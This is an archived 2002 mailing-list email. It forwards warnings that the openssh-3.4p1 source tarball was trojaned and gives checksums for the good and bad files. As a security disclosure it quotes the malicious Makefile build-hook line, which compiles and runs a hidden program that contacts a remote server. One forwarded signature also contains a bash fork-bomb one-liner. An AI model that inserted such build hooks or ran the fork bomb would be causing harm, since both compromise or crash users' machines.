Received: from jazzswing.ncsc.mil (jazzswing.ncsc.mil [144.51.68.65])
	by tycho.ncsc.mil (8.9.3/8.9.3) with ESMTP id IAA19209
	for <selinux@tycho.nsa.gov>; Thu, 1 Aug 2002 08:01:31 -0400 (EDT)
Received: from jazzswing.ncsc.mil (localhost [127.0.0.1])
	by jazzswing.ncsc.mil  with ESMTP id MAA07489
	for <selinux@tycho.nsa.gov>; Thu, 1 Aug 2002 12:00:40 GMT
Received: from tsv.sws.net.au (tsv.sws.net.au [203.36.46.2])
	by jazzswing.ncsc.mil  with ESMTP id MAA07485
	for <selinux@tycho.nsa.gov>; Thu, 1 Aug 2002 12:00:37 GMT
Received: from lyta.coker.com.au (localhost [127.0.0.1])
	by tsv.sws.net.au (Postfix) with ESMTP id 24D9792469
	for <selinux@tycho.nsa.gov>; Thu,  1 Aug 2002 22:01:25 +1000 (EST)
Received: from there (localhost [127.0.0.1])
	by lyta.coker.com.au (Postfix) with SMTP id 8AF232EF
	for <selinux@tycho.nsa.gov>; Thu,  1 Aug 2002 14:01:16 +0200 (CEST)
Content-Type: text/plain;
  charset="iso-8859-1"
From: Russell Coker <russell@coker.com.au>
Reply-To: Russell Coker <russell@coker.com.au>
To: SE Linux <selinux@tycho.nsa.gov>
Subject: Fwd: Re: [SAGE-AU] FW: openssh-3.4p1.tar.gz trojaned
Date: Thu, 1 Aug 2002 14:01:16 +0200
MIME-Version: 1.0
Message-Id: <20020801120116.8AF232EF@lyta.coker.com.au>
Sender: owner-selinux@tycho.nsa.gov
List-Id: selinux@tycho.nsa.gov

The source of my Debian package of a SE patched ssh is the right version, not 
the trojaned version:
rjc@lyta:/home/www/selinux/ssh$ md5sum openssh_3.4p1.orig.tar.gz
459c1d0262e939d6432f193c7a4ba8a8  openssh_3.4p1.orig.tar.gz
rjc@lyta:/home/www/selinux/ssh$

----------  Forwarded Message  ----------

Subject: FWD:  Re: [SAGE-AU] FW: openssh-3.4p1.tar.gz trojaned
Date: Thu, 1 Aug 2002 12:43:07 +0200
From: Paul Dwerryhouse <paul@dwerryhouse.com.au>
To: Faye <faye@lurking-grue.org>, Russ <russell@coker.com.au>

I wonder if the Debian packages were built from the trojaned version or
not.

Most of the mirrors seem to have picked up the trojaned one, although
I've found that the following one is ok:

ftp://ftp.au.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz



----- Forwarded message from Mark Sergeant <sarge@snsonline.net> -----

From: Mark Sergeant <sarge@snsonline.net>
Date: 01 Aug 2002 18:27:09 +1000
To: chris@aims.com.au
Cc: sage-au@sage-au.org.au
Subject: Re: [SAGE-AU] FW: openssh-3.4p1.tar.gz trojaned
Lines: 104

md5sum for trojan ... 3ac9bc346d736b4a51d676faa2a08a57
md5sum for good ... 459c1d0262e939d6432f193c7a4ba8a8

On Thu, 2002-08-01 at 17:54, Chris Knight wrote:
> Howdy,
>
> Just saw this pass through the freebsd-security mailing list.
> I haven't verified this, but at least the MD5 checksums will prove useful.
>
> Regards,
> Chris Knight
> Systems Administrator
> AIMS Independent Computer Professionals
> Tel: +61 3 6334 6664  Fax: +61 3 6331 7032  Mob: +61 419 528 795
> Web: http://www.aims.com.au
>
>
>
> -----Original Message-----
> From: owner-freebsd-security@FreeBSD.ORG
> [mailto:owner-freebsd-security@FreeBSD.ORG]On Behalf Of Edwin Groothuis
> Sent: Thursday, 1 August 2002 17:35
> To: freebsd-security@FreeBSD.ORG
> Subject: openssh-3.4p1.tar.gz trojaned
>
>
> FYI (I'm not on -security)
>
> ----- Forwarded message from Edwin Groothuis <edwin@mavetju.org> -----
>
> Date: Thu, 1 Aug 2002 16:55:51 +1000
> From: Edwin Groothuis <edwin@mavetju.org>
> To: incidents@securityfocus.com
> Subject: openssh-3.4p1.tar.gz trojaned
>
> Greetings,
>
> Just want to inform you that the OpenSSH package op ftp.openbsd.org
> (and probably all its mirrors now) it trojaned:
>
>     ftp://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz
>
> The OpenBSD people have been informed about it (via email to
> deraadt@openbsd.org and via irc.openprojects.org/#openbsd)
>
>
> The changed files are openssh-3.4p1/openbsd-compat/Makefile.in:
>  all: libopenbsd-compat.a
> +       @ $(CC) bf-test.c -o bf-test; ./bf-test>bf-test.out; sh
> ./bf-test.out &
>
> bf-test.c[1] is nothing more than a wrapper which generates a
> shell-script[2] which compiles itself and tries to connect to an
> server running on 203.62.158.32:6667 (web.snsonline.net).
>
> [1] http://www.mavetju.org/~edwin/bf-test.c
> [2] http://www.mavetju.org/~edwin/bf-output.sh
>
> This is the md5 checksum of the openssh-3.4p1.tar.gz in the FreeBSD
> ports system:
>     MD5 (openssh-3.4p1.tar.gz) = 459c1d0262e939d6432f193c7a4ba8a8
>
> This is the md5 checksum of the trojaned openssh-3.4p1.tar.gz:
>     MD5 (openssh-3.4p1.tar.gz) = 3ac9bc346d736b4a51d676faa2a08a57
>
> Edwin
>
> --
> Edwin Groothuis      |            Personal website: http://www.MavEtJu.org
> edwin@mavetju.org    |    Weblog: http://www.mavetju.org/weblog/weblog.php
> bash$ :(){ :|:&};:   | Interested in MUDs? http://www.FatalDimensions.org/
>
> To Unsubscribe: send mail to majordomo@FreeBSD.org
> with "unsubscribe freebsd-security" in the body of the message
>
>
> --------
> SAGE-AU'2002: 5 - 9 August 2002, Novotel Melbourne on Collins, Melbourne.
> See http://www.sage-au.org.au/conf/ for program and registration info.
> ----------
> The SAGE-AU mailing list is a member-only service.  Postings to this list
> are made by individual members, and do not necessarily reflect SAGE-AU
> policy or position.  This article may not be reproduced or quoted beyond
> this forum without written permission of all contributing authors.  Further
> information can be found at http://www.sage-au.org.au/mailinglists.html

--
Mark Sergeant
Senior Unix Systems Administrator

SNSOnline Technical Services
.:E - msergeant@snsonline.net
.:P - +61 (0) 4127 14263
.:D - http://www.snsonline.net/disclaimer/
--------
SAGE-AU'2002: 5 - 9 August 2002, Novotel Melbourne on Collins, Melbourne.
See http://www.sage-au.org.au/conf/ for program and registration info.
----------
The SAGE-AU mailing list is a member-only service.  Postings to this list are
made by individual members, and do not necessarily reflect SAGE-AU policy or
position.  This article may not be reproduced or quoted beyond this forum
without written permission of all contributing authors.  Further information
can be found at http://www.sage-au.org.au/mailinglists.html

----- End forwarded message -----

-------------------------------------------------------

-- 
I do not get viruses because I do not use MS software.
If you use Outlook then please do not put my email address in your
address-book so that WHEN you get a virus it won't use my address in the
>From field.

--
You have received this message because you are subscribed to the selinux list.
If you no longer wish to subscribe, send mail to majordomo@tycho.nsa.gov with
the words "unsubscribe selinux" without quotes as the message.
